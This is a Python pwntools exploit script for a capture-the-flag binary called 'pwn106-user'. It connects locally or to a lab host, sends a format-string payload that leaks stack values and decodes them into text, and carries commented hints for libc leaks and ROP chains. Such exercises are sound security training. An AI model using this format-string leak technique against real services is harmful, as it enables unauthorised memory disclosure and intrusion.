#!/usr/bin/env python3
from pwn import *
import sys, os

# pwntools RE/exploit template
# Usage examples:
#  ./run.py                 # run locally
#  ./run.py REMOTE=1 HOST=1.2.3.4 PORT=1337  # connect to remote
#  ./run.py GDB=1           # run under gdb
#  ./run.py LIBC=./libc.so.6  # load specific libc for symbols


# ---------- CONFIG ----------
BINARY_PATH = "./pwn106-user-1644300441063.pwn106-user"           # <<-- change to target binary
HOST = os.getenv("HOST","10.49.160.178")
PORT = int(os.getenv("PORT",9006))
elf = ELF(BINARY_PATH)
context.binary=elf # change arch/endianness as needed
context.log_level='DEBUG' 


# load libc if provided on command line: LIBC=./libc.so.6
libc = ELF(args.LIBC) if args.LIBC else None

# GDB script (edit breakpoints as needed)
gdbscript = '''
run
'''.strip()

# ---------- START/CONNECT ----------
def start():
    """
    Start the process or connect to remote.
    Use command line flags:
      GDB=1      -> run under gdb
      REMOTE=1   -> connect to remote using HOST and PORT (or args.HOST/args.PORT)
    """
    if args.REMOTE:
        host = args.HOST if args.HOST else HOST
        port = int(args.PORT) if args.PORT else PORT
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([BINARY_PATH], gdbscript=gdbscript)
    # import subprocess
    # subprocess.Popen(['pwndbg', BINARY_PATH])
    # return process([BINARY_PATH])
    else:
        return process([BINARY_PATH])

# ---------- HELPERS ----------
def u64_safe(x):
    x = x.ljust(8, b"\x00")
    return u64(x)

def leak_address(io, send_payload_fn, parse_fn):
    """
    Generic leak helper:
      - send_payload_fn(io) should send the leak payload and return None
      - parse_fn(io) should read from io and return the leaked integer address
    Returns the parsed integer.
    """
    send_payload_fn(io)
    return parse_fn(io)

# simple wrappers for clarity
def sl(io, data): io.sendline(data)
def s(io, data): io.send(data)
def ru(io, s, drop=True): return io.recvuntil(s, drop)
def rl(io): return io.recvline()

# ---------- EXPLOIT ----------
def exploit(io):
    """
    Fill this with your exploit steps. Example leak pattern is shown.
    """
    ru(io,b"giveaway: ")
    sl(io,"%6$lX %7$lX %8$lX %9$lX %10$lX %11$lX")
    rl(io)
    # receive line and split into 3 qwords
    buffer = rl(io).strip().split(b" ")

    result = b""
    for word in buffer[1:]:  # take first 3 qwords
        # convert hex string to integer
        val = int(word, 16)
        # turn integer into 8 bytes (little endian)
        result += val.to_bytes(8, 'little')

    # decode into characters
    print("ini buffer", result.decode())
    
    # receive leaked address (example: reading a line that contains leaked bytes)
    # leaked = io.recvline(timeout=2)
    # log.info("Raw leak: %s", leaked)
    # parse leaked bytes into address (depends on binary output)    
    # e.g., addr = u64_safe(leaked[:8])
    # log.success("Leaked puts@GLIBC: 0x{:x}".format(addr))
    
    
    
    # If libc known, compute base and find system/one_gadget
    if libc:
        # example: libc_base = leaked_puts - libc.symbols['puts']
        pass

    # final exploit (overwrite RIP, ret2system, one_gadget, ROP chain, etc.)
    # io.sendline(final_payload)
    io.interactive()

# ---------- MAIN ----------
if __name__ == "__main__":
    io = start()
    try:
        exploit(io)
    except KeyboardInterrupt:
        io.close()
        raise